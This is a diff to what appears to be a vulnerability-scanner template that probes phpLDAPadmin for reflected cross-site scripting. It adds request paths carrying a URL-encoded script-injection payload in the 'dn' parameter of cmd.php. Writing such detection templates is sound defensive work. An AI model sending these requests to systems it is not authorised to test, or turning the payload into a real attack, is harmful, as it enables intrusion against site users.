@@ -13,8 +13,12 @@ moves:
     - verb: GET
       to:
         - '{{BaseURL}}'
-        - '{{BaseURL}}{{path}}/cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1'
-        - '{{BaseURL}}{{path}}/index.php?redirect=true&meth=ajax'
+        - '{{BaseURL}}//cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1'
+        - '{{BaseURL}}//index.php?redirect=true&meth=ajax'
+        - '{{BaseURL}}/htdocs/index.php/cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1'
+        - '{{BaseURL}}/htdocs/index.php/index.php?redirect=true&meth=ajax'
+        - '{{BaseURL}}/phpldapadmin/cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1'
+        - '{{BaseURL}}/phpldapadmin/index.php?redirect=true&meth=ajax'
       signs:
         - "on": word
           has:
